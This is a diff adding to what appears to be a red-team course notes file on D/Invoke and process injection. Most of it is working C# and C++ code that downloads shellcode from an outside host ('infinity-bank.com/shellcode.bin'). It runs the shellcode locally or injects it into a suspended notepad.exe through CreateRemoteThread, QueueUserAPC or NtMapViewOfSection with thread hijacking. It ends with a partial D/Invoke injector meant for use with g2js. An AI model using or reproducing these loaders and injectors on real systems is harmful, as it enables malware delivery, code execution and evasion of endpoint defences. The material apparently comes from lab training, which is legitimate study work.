@@ -338,3 +338,1454 @@ Go to _Project > Add Reference > Browse_ and add a reference to `DInvoke.Data.dl
 
 Change the DllImport attribute to `UnmanagedFunctionPointer` and the extern keyword to `delegate`
 
+CSharp code for createprocess with D/Invoke:
+
+program.cs
+```
+using DInvoke.DynamicInvoke;
+using System;
+using System.Runtime.InteropServices;
+
+namespace ConsoleApp1
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            // create startup info
+            var startupInfo = new Win32.STARTUPINFO();
+            startupInfo.cb = Marshal.SizeOf(startupInfo);
+
+            // create process
+            object[] parameters = {null, "notepad.exe", IntPtr.Zero, IntPtr.Zero, false, (uint)0,
+            IntPtr.Zero, null, startupInfo, new Win32.PROCESS_INFORMATION()};
+
+            var success = (bool)Generic.DynamicApiInvoke(
+            "kernel32.dll",
+            "CreateProcessW",
+            typeof(Win32.CreateProcessWDelegate),
+            ref parameters);
+
+            var processInfo = (Win32.PROCESS_INFORMATION)parameters[9];
+
+            // bail if it failed
+            if (!success)
+            {
+                Console.WriteLine("[x] CreateProcessW failed");
+                return;
+            }
+
+            // print process info
+            Console.WriteLine("dwProcessId : {0}", processInfo.dwProcessId);
+            Console.WriteLine("dwThreadId  : {0}", processInfo.dwThreadId);
+            Console.WriteLine("hProcess    : 0x{0:X}", processInfo.hProcess);
+            Console.WriteLine("hThread     : 0x{0:X}", processInfo.hThread);
+
+            // close handles
+            Win32.CloseHandle(processInfo.hThread);
+            Win32.CloseHandle(processInfo.hProcess);
+        }
+    }
+}
+```
+
+Win32.cs class:
+```
+using System.Runtime.InteropServices;
+
+internal static class Win32
+{
+    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+
+    public delegate bool CreateProcessWDelegate(
+        string applicationName,
+        string commandLine, 
+        IntPtr processAttributes,
+        IntPtr threadAttribuates,
+        bool inheritHandles,
+        CREATION_FLAGS creationFlags,
+        IntPtr environment,
+        string currentDirectory,
+        ref STARTUPINFO startupInfo,
+        out PROCESS_INFORMATION processInfo);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr hObject);
+
+    [Flags]
+    public enum CREATION_FLAGS : uint
+    {
+        DEBUG_PROCESS = 0x00000001,
+        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+        CREATE_SUSPENDED = 0x00000004,
+        DETACHED_PROCESS = 0x00000008,
+        CREATE_NEW_CONSOLE = 0x00000010,
+        NORMAL_PRIORITY_CLASS = 0x00000020,
+        IDLE_PRIORITY_CLASS = 0x00000040,
+        HIGH_PRIORITY_CLASS = 0x00000080,
+        REALTIME_PRIORITY_CLASS = 0x00000100,
+        CREATE_NEW_PROCESS_GROUP = 0x00000200,
+        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+        CREATE_SEPARATE_WOW_VDM = 0x00000800,
+        CREATE_SHARED_WOW_VDM = 0x00001000,
+        CREATE_FORCEDOS = 0x00002000,
+        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
+        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
+        INHERIT_PARENT_AFFINITY = 0x00010000,
+        INHERIT_CALLER_PRIORITY = 0x00020000,
+        CREATE_PROTECTED_PROCESS = 0x00040000,
+        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
+        PROCESS_MODE_BACKGROUND_END = 0x00200000,
+        CREATE_SECURE_PROCESS = 0x00400000,
+        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+        CREATE_NO_WINDOW = 0x08000000,
+        PROFILE_USER = 0x10000000,
+        PROFILE_KERNEL = 0x20000000,
+        PROFILE_SERVER = 0x40000000,
+        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO
+    {
+        public int cb;
+        public IntPtr lpReserved;
+        public IntPtr lpDesktop;
+        public IntPtr lpTitle;
+        public int dwX;
+        public int dwY;
+        public int dwXSize;
+        public int dwYSize;
+        public int dwXCountChars;
+        public int dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+}
+```
+
+Changes to program.cs to make use of ordinals:
+
+```
+using DInvoke.DynamicInvoke;
+using System;
+using System.Runtime.InteropServices;
+
+namespace ConsoleApp1
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            // create startup info
+            var startupInfo = new Win32.STARTUPINFO();
+            startupInfo.cb = Marshal.SizeOf(startupInfo);
+
+            // create process
+            object[] parameters = {null, "notepad.exe", IntPtr.Zero, IntPtr.Zero, false, (uint)0,
+            IntPtr.Zero, null, startupInfo, new Win32.PROCESS_INFORMATION()};
+
+            var hLibrary = Generic.GetLibraryAddress("kernel32.dll", 233);
+
+            var success = (bool)Generic.DynamicFunctionInvoke(
+    hLibrary,
+    typeof(Win32.CreateProcessWDelegate),
+    ref parameters);
+
+            var processInfo = (Win32.PROCESS_INFORMATION)parameters[9];
+
+            // bail if it failed
+            if (!success)
+            {
+                Console.WriteLine("[x] CreateProcessW failed");
+                return;
+            }
+
+            // print process info
+            Console.WriteLine("dwProcessId : {0}", processInfo.dwProcessId);
+            Console.WriteLine("dwThreadId  : {0}", processInfo.dwThreadId);
+            Console.WriteLine("hProcess    : 0x{0:X}", processInfo.hProcess);
+            Console.WriteLine("hThread     : 0x{0:X}", processInfo.hThread);
+
+            // close handles
+            Win32.CloseHandle(processInfo.hThread);
+            Win32.CloseHandle(processInfo.hProcess);
+        }
+    }
+}
+```
+
+## Process Injection
+
+do _Payloads > Windows Stageless Generate All Payloads_ then we will host both the raw payloads for the http listener that use ExitProcess and ExitThread.
+
+Download files CSharp:
+
+```
+using System;
+using System.Net.Http;
+using System.Threading.Tasks;
+
+namespace InfinityBankShellcodeDownloader
+{
+    class Program
+    {
+        static async Task Main(string[] args)
+        {
+            byte[] shellcode;
+
+            using (var client = new HttpClient())
+            {
+                client.BaseAddress = new Uri("https://www.infinity-bank.com");
+                shellcode = await client.GetByteArrayAsync("/shellcode.bin");
+            }
+
+            Console.WriteLine("Shellcode downloaded successfully.");
+            Console.WriteLine("Press any key to exit.");
+            Console.ReadKey();
+        }
+    }
+}
+```
+
+C++ downloading and executing with function delegate
+
+```
+#include <Windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <vector>
+
+#pragma comment(lib, "winhttp.lib")
+
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
+
+int main()
+{
+    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");
+
+    //get point to buffer
+    LPVOID ptr = &shellcode[0];
+
+    //set memory to RWX
+    DWORD oldProtect = 0;
+    VirtualProtect(ptr, shellcode.size(), PAGE_EXECUTE_READWRITE, &oldProtect);
+
+    (*(void(*)()) ptr)();
+}
+
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
+
+    // initialise session
+    HINTERNET hSession = WinHttpOpen(
+        NULL,
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
+
+    // create session for target
+    HINTERNET hConnect = WinHttpConnect(
+        hSession,
+        baseAddress,
+        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
+        0);
+
+    // create request handle
+    HINTERNET hRequest = WinHttpOpenRequest(
+        hConnect,
+        L"GET",
+        filename,
+        NULL,
+        WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);                   // ssl
+
+    // send the request
+    WinHttpSendRequest(
+        hRequest,
+        WINHTTP_NO_ADDITIONAL_HEADERS,
+        0,
+        WINHTTP_NO_REQUEST_DATA,
+        0,
+        0,
+        0);
+
+    // receive response
+    WinHttpReceiveResponse(
+        hRequest,
+        NULL);
+
+    // read the data
+    std::vector<BYTE> buffer;
+    DWORD bytesRead = 0;
+
+    do {
+
+        BYTE temp[4096]{};
+        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
+
+        if (bytesRead > 0) {
+            buffer.insert(buffer.end(), temp, temp + bytesRead);
+        }
+
+    } while (bytesRead > 0);
+
+    // close all the handles
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return buffer;
+}
+```
+
+Download files C++ with CreateThread:
+```
+#include <Windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <vector>
+#include <conio.h>
+
+#pragma comment(lib, "winhttp.lib")
+
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
+
+int main()
+{
+    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");
+
+    //get point to buffer
+    LPVOID ptr = &shellcode[0];
+
+    //set memory to RWX
+    DWORD oldProtect = 0;
+    VirtualProtect(ptr, shellcode.size(), PAGE_EXECUTE_READWRITE, &oldProtect);
+
+    //execute 
+    DWORD threadId = 0;
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, &threadId);
+
+    //close handle
+    CloseHandle(hThread);
+
+    //stop the program from closing
+    std::cout << "Shellcode is running, press key to exit" << std::endl;
+    _getch();
+}
+
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
+
+    // initialise session
+    HINTERNET hSession = WinHttpOpen(
+        NULL,
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
+
+    // create session for target
+    HINTERNET hConnect = WinHttpConnect(
+        hSession,
+        baseAddress,
+        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
+        0);
+
+    // create request handle
+    HINTERNET hRequest = WinHttpOpenRequest(
+        hConnect,
+        L"GET",
+        filename,
+        NULL,
+        WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);                   // ssl
+
+    // send the request
+    WinHttpSendRequest(
+        hRequest,
+        WINHTTP_NO_ADDITIONAL_HEADERS,
+        0,
+        WINHTTP_NO_REQUEST_DATA,
+        0,
+        0,
+        0);
+
+    // receive response
+    WinHttpReceiveResponse(
+        hRequest,
+        NULL);
+
+    // read the data
+    std::vector<BYTE> buffer;
+    DWORD bytesRead = 0;
+
+    do {
+
+        BYTE temp[4096]{};
+        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
+
+        if (bytesRead > 0) {
+            buffer.insert(buffer.end(), temp, temp + bytesRead);
+        }
+
+    } while (bytesRead > 0);
+
+    // close all the handles
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return buffer;
+}
+```
+
+C++ CreateRemoteThread with notepad.exe:
+
+```
+#include <Windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <vector>
+#include <conio.h>
+
+#pragma comment(lib, "winhttp.lib")
+
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
+
+int main()
+{
+    // create startup info struct
+    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
+    startup_info->cb = sizeof(STARTUPINFOW);
+    startup_info->dwFlags = STARTF_USESHOWWINDOW;
+
+    // create process info struct
+    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();
+
+    // null terminated command line
+    wchar_t cmd[] = L"notepad.exe\0";
+
+    // create process
+    CreateProcess(
+        NULL,
+        cmd,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NO_WINDOW,
+        NULL,
+        NULL,
+        startup_info,
+        process_info);
+
+    // download shellcode
+    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");
+
+    // allocate memory
+    LPVOID ptr = VirtualAllocEx(
+        process_info->hProcess,
+        NULL,
+        shellcode.size(),
+        MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE);
+
+    // copy shellcode
+    SIZE_T bytesWritten = 0;
+    WriteProcessMemory(
+        process_info->hProcess,
+        ptr,
+        &shellcode[0],
+        shellcode.size(),
+        &bytesWritten);
+
+    // create remote thread
+    DWORD threadId = 0;
+    HANDLE hThread = CreateRemoteThread(
+        process_info->hProcess,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)ptr,
+        NULL,
+        0,
+        &threadId);
+
+    // close handles
+    CloseHandle(hThread);
+    CloseHandle(process_info->hThread);
+    CloseHandle(process_info->hProcess);
+}
+
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
+
+    // initialise session
+    HINTERNET hSession = WinHttpOpen(
+        NULL,
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
+
+    // create session for target
+    HINTERNET hConnect = WinHttpConnect(
+        hSession,
+        baseAddress,
+        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
+        0);
+
+    // create request handle
+    HINTERNET hRequest = WinHttpOpenRequest(
+        hConnect,
+        L"GET",
+        filename,
+        NULL,
+        WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);                   // ssl
+
+    // send the request
+    WinHttpSendRequest(
+        hRequest,
+        WINHTTP_NO_ADDITIONAL_HEADERS,
+        0,
+        WINHTTP_NO_REQUEST_DATA,
+        0,
+        0,
+        0);
+
+    // receive response
+    WinHttpReceiveResponse(
+        hRequest,
+        NULL);
+
+    // read the data
+    std::vector<BYTE> buffer;
+    DWORD bytesRead = 0;
+
+    do {
+
+        BYTE temp[4096]{};
+        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
+
+        if (bytesRead > 0) {
+            buffer.insert(buffer.end(), temp, temp + bytesRead);
+        }
+
+    } while (bytesRead > 0);
+
+    // close all the handles
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return buffer;
+}
+```
+
+C++ QueueUserAPC
+
+```
+#include <Windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <vector>
+#include <conio.h>
+
+#pragma comment(lib, "winhttp.lib")
+
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
+
+int main()
+{
+    // create startup info struct
+    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
+    startup_info->cb = sizeof(STARTUPINFOW);
+    startup_info->dwFlags = STARTF_USESHOWWINDOW;
+
+    // create process info struct
+    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();
+
+    // null terminated command line
+    wchar_t cmd[] = L"notepad.exe\0";
+
+    // create process
+    CreateProcess(
+        NULL,
+        cmd,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NO_WINDOW | CREATE_SUSPENDED,
+        NULL,
+        NULL,
+        startup_info,
+        process_info);
+
+    // download shellcode
+    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");
+
+    // allocate memory
+    LPVOID ptr = VirtualAllocEx(
+        process_info->hProcess,
+        NULL,
+        shellcode.size(),
+        MEM_COMMIT,
+        PAGE_EXECUTE_READWRITE);
+
+    // copy shellcode
+    SIZE_T bytesWritten = 0;
+    WriteProcessMemory(
+        process_info->hProcess,
+        ptr,
+        &shellcode[0],
+        shellcode.size(),
+        &bytesWritten);
+
+    //Queue APC
+    QueueUserAPC((PAPCFUNC)ptr, process_info->hThread, 0);
+
+    //resume process
+    ResumeThread(process_info->hThread);
+
+    // close handles
+    CloseHandle(process_info->hThread);
+    CloseHandle(process_info->hProcess);
+}
+
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
+
+    // initialise session
+    HINTERNET hSession = WinHttpOpen(
+        NULL,
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
+
+    // create session for target
+    HINTERNET hConnect = WinHttpConnect(
+        hSession,
+        baseAddress,
+        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
+        0);
+
+    // create request handle
+    HINTERNET hRequest = WinHttpOpenRequest(
+        hConnect,
+        L"GET",
+        filename,
+        NULL,
+        WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);                   // ssl
+
+    // send the request
+    WinHttpSendRequest(
+        hRequest,
+        WINHTTP_NO_ADDITIONAL_HEADERS,
+        0,
+        WINHTTP_NO_REQUEST_DATA,
+        0,
+        0,
+        0);
+
+    // receive response
+    WinHttpReceiveResponse(
+        hRequest,
+        NULL);
+
+    // read the data
+    std::vector<BYTE> buffer;
+    DWORD bytesRead = 0;
+
+    do {
+
+        BYTE temp[4096]{};
+        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
+
+        if (bytesRead > 0) {
+            buffer.insert(buffer.end(), temp, temp + bytesRead);
+        }
+
+    } while (bytesRead > 0);
+
+    // close all the handles
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return buffer;
+}
+```
+
+
+C++ header file for NtMapViewOfSection named Native.h
+
+```
+#pragma once
+#include <Windows.h>
+#include <winternl.h>
+
+using NtCreateSection = NTSTATUS(NTAPI*)(
+	OUT PHANDLE SectionHandle,
+	IN ULONG DesiredAccess,
+	IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
+	IN OPTIONAL PLARGE_INTEGER MaximumSize,
+	IN ULONG PageAttributess,
+	IN ULONG SectionAttributes,
+	IN OPTIONAL HANDLE FileHandle);
+
+using NtMapViewOfSection = NTSTATUS(NTAPI*)(
+	IN HANDLE SectionHandle,
+	IN HANDLE ProcessHandle,
+	IN OUT PVOID* BaseAddress,
+	IN ULONG_PTR ZeroBits,
+	IN SIZE_T CommitSize,
+	IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,
+	IN OUT PSIZE_T ViewSize,
+	IN DWORD InheritDisposition,
+	IN ULONG AllocationType,
+	IN ULONG Win32Protect);
+
+using NtUnmapViewOfSection = NTSTATUS(NTAPI*)(
+	IN HANDLE ProcessHandle,
+	IN PVOID BaseAddress OPTIONAL);
+
+typedef enum _SECTION_INHERIT : DWORD {
+	ViewShare = 1,
+	ViewUnmap = 2
+} SECTION_INHERIT, * PSECTION_INHERIT;
+```
+
+C++ Code for NTMapViewOfSection:
+
+```
+#include <Windows.h>
+#include <winhttp.h>
+#include <iostream>
+#include <vector>
+#include <conio.h>
+#include "Native.h"
+
+#pragma comment(lib, "winhttp.lib")
+
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
+
+int main()
+{
+    // create startup info struct
+    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
+    startup_info->cb = sizeof(STARTUPINFOW);
+    startup_info->dwFlags = STARTF_USESHOWWINDOW;
+
+    // create process info struct
+    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();
+
+    // null terminated command line
+    wchar_t cmd[] = L"notepad.exe\0";
+
+    // create process
+    BOOL success = CreateProcess(
+        NULL,
+        cmd,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NO_WINDOW | CREATE_SUSPENDED,
+        NULL,
+        NULL,
+        startup_info,
+        process_info);
+
+    // download shellcode
+    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");
+
+    // find Nt APIs
+    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
+    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
+    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
+
+    // create section in local process
+    HANDLE hSection;
+    LARGE_INTEGER szSection = { shellcode.size() };
+
+    NTSTATUS status = ntCreateSection(
+        &hSection,
+        SECTION_ALL_ACCESS,
+        NULL,
+        &szSection,
+        PAGE_EXECUTE_READWRITE,
+        SEC_COMMIT,
+        NULL);
+
+    // map section into memory of local process
+    PVOID hLocalAddress = NULL;
+    SIZE_T viewSize = 0;
+
+    status = ntMapViewOfSection(
+        hSection,
+        GetCurrentProcess(),
+        &hLocalAddress,
+        NULL,
+        NULL,
+        NULL,
+        &viewSize,
+        ViewShare,
+        NULL,
+        PAGE_EXECUTE_READWRITE);
+
+    // copy shellcode into local memory
+    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());
+
+    // map section into memory of remote process
+    PVOID hRemoteAddress = NULL;
+
+    status = ntMapViewOfSection(
+        hSection,
+        process_info->hProcess,
+        &hRemoteAddress,
+        NULL,
+        NULL,
+        NULL,
+        &viewSize,
+        ViewShare,
+        NULL,
+        PAGE_EXECUTE_READWRITE);
+
+    // get context of main thread
+    LPCONTEXT pContext = new CONTEXT();
+    pContext->ContextFlags = CONTEXT_INTEGER;
+    GetThreadContext(process_info->hThread, pContext);
+
+    // update rcx context
+    pContext->Rcx = (DWORD64)hRemoteAddress;
+    SetThreadContext(process_info->hThread, pContext);
+
+    // resume thread
+    ResumeThread(process_info->hThread);
+
+    // unmap memory from local process
+    status = ntUnmapViewOfSection(
+        GetCurrentProcess(),
+        hLocalAddress);
+}
+
+std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
+
+    // initialise session
+    HINTERNET hSession = WinHttpOpen(
+        NULL,
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl
+
+    // create session for target
+    HINTERNET hConnect = WinHttpConnect(
+        hSession,
+        baseAddress,
+        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
+        0);
+
+    // create request handle
+    HINTERNET hRequest = WinHttpOpenRequest(
+        hConnect,
+        L"GET",
+        filename,
+        NULL,
+        WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);                   // ssl
+
+    // send the request
+    WinHttpSendRequest(
+        hRequest,
+        WINHTTP_NO_ADDITIONAL_HEADERS,
+        0,
+        WINHTTP_NO_REQUEST_DATA,
+        0,
+        0,
+        0);
+
+    // receive response
+    WinHttpReceiveResponse(
+        hRequest,
+        NULL);
+
+    // read the data
+    std::vector<BYTE> buffer;
+    DWORD bytesRead = 0;
+
+    do {
+
+        BYTE temp[4096]{};
+        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);
+
+        if (bytesRead > 0) {
+            buffer.insert(buffer.end(), temp, temp + bytesRead);
+        }
+
+    } while (bytesRead > 0);
+
+    // close all the handles
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return buffer;
+}
+```
+
+
+## 
+
+
+
+## Xuh stuff
+
+FROM XUH C# dinvoke injector code that you can use in g2js, or just on its own :
+```
+using DInvoke.Data;
+using DInvoke.DynamicInvoke;
+using System;
+using System.Net;
+using System.Runtime.InteropServices;
+
+namespace TestAssembly
+{
+public class Program
+{
+
+[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+
+public delegate bool CreateProcessWDelegate(
+string applicationName,
+string commandLine,
+IntPtr processAttributes,
+IntPtr threadAttributes,
+bool inheritHandles,
+CREATION_FLAGS creationFlags,
+IntPtr environment,
+string currentDirectory,
+ref STARTUPINFO startupInfo,
+out PROCESS_INFORMATION processInformation);
+
+[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+
+public delegate bool CloseHandleDelegate(IntPtr hObject);
+
+[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+
+public delegate uint QueueUserAPCDelegate(IntPtr pfnAPC, // Pointer to the APC function
+IntPtr hThread, // Handle to the thread
+
+IntPtr dwData // Data to be passed to the APC function
+
+);
+
+[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet =
+
+CharSet.Unicode, SetLastError = true)]
+
+public delegate uint ResumeThreadDelegate(
+
+IntPtr hThread // Handle to the thread
+
+);
+
+[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet =
+
+CharSet.Unicode, SetLastError = true)]
+
+public delegate IntPtr VirtualAllocExDelegate(
+
+IntPtr hProcess,
+
+IntPtr lpAddress,
+
+uint dwSize,
+
+uint flAllocationType,
+
+uint flProtect);
+
+[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet =
+
+CharSet.Unicode, SetLastError = true)]
+
+public delegate bool VirtualProtectExDelegate(
+
+IntPtr hProcess,
+
+IntPtr lpAddress,
+
+uint dwSize,
+
+uint flNewProtect,
+
+out uint lpflOldProtect);
+
+[UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet =
+
+CharSet.Unicode, SetLastError = true)]
+
+public delegate bool WriteProcessMemoryDelegate(
+
+IntPtr hProcess,
+
+IntPtr lpBaseAddress,
+
+byte[] lpBuffer,
+
+uint nSize,
+
+out IntPtr lpNumberOfBytesWritten);
+
+[Flags]
+
+public enum ALLOCATION_TYPE : uint
+
+{
+
+MEM_COMMIT = 0x1000,
+
+MEM_RESERVE = 0x2000,
+
+MEM_DECOMMIT = 0x4000,
+
+MEM_RELEASE = 0x8000,
+
+MEM_RESET = 0x80000,
+
+MEM_PHYSICAL = 0x400000,
+
+MEM_TOP_DOWN = 0x100000,
+
+MEM_WRITE_WATCH = 0x200000,
+
+MEM_LARGE_PAGES = 0x20000000
+
+}
+
+[Flags]
+
+public enum MEMORY_PROTECTION : uint
+
+{
+
+PAGE_NOACCESS = 0x01,
+
+PAGE_READONLY = 0x02,
+
+PAGE_READWRITE = 0x04,
+
+PAGE_WRITECOPY = 0x08,
+
+PAGE_EXECUTE = 0x10,
+
+PAGE_EXECUTE_READ = 0x20,
+
+PAGE_EXECUTE_READWRITE = 0x40,
+
+PAGE_EXECUTE_WRITECOPY = 0x80,
+
+PAGE_GUARD = 0x100,
+
+PAGE_NOCACHE = 0x200,
+
+PAGE_WRITECOMBINE = 0x400
+
+}
+
+[Flags]
+
+public enum CREATION_FLAGS : uint
+
+{
+
+DEBUG_PROCESS = 0x00000001,
+
+DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+
+CREATE_SUSPENDED = 0x00000004,
+
+DETACHED_PROCESS = 0x00000008,
+
+CREATE_NEW_CONSOLE = 0x00000010,
+
+NORMAL_PRIORITY_CLASS = 0x00000020,
+
+IDLE_PRIORITY_CLASS = 0x00000040,
+
+HIGH_PRIORITY_CLASS = 0x00000080,
+
+REALTIME_PRIORITY_CLASS = 0x00000100,
+
+CREATE_NEW_PROCESS_GROUP = 0x00000200,
+
+CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+
+CREATE_SEPARATE_WOW_VDM = 0x00000800,
+
+CREATE_SHARED_WOW_VDM = 0x00001000,
+
+CREATE_FORCEDOS = 0x00002000,
+
+BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
+
+ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
+
+INHERIT_PARENT_AFFINITY = 0x00010000,
+
+INHERIT_CALLER_PRIORITY = 0x00020000,
+
+CREATE_PROTECTED_PROCESS = 0x00040000,
+
+EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+
+PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
+
+PROCESS_MODE_BACKGROUND_END = 0x00200000,
+
+CREATE_SECURE_PROCESS = 0x00400000,
+
+CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+
+CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+
+CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+
+CREATE_NO_WINDOW = 0x08000000,
+
+PROFILE_USER = 0x10000000,
+
+PROFILE_KERNEL = 0x20000000,
+
+PROFILE_SERVER = 0x40000000,
+
+CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
+
+}
+
+[StructLayout(LayoutKind.Sequential)]
+
+public struct STARTUPINFO
+
+{
+
+public int cb;
+
+public IntPtr lpReserved;
+
+public IntPtr lpDesktop;
+
+public IntPtr lpTitle;
+
+public int dwX;
+
+public int dwY;
+
+public int dwXSize;
+
+public int dwYSize;
+
+public int dwXCountChars;
+
+public int dwYCountChars;
+
+public int dwFillAttribute;
+
+public int dwFlags;
+
+public short wShowWindow;
+
+public short cbReserved2;
+
+public IntPtr lpReserved2;
+
+public IntPtr hStdInput;
+
+public IntPtr hStdOutput;
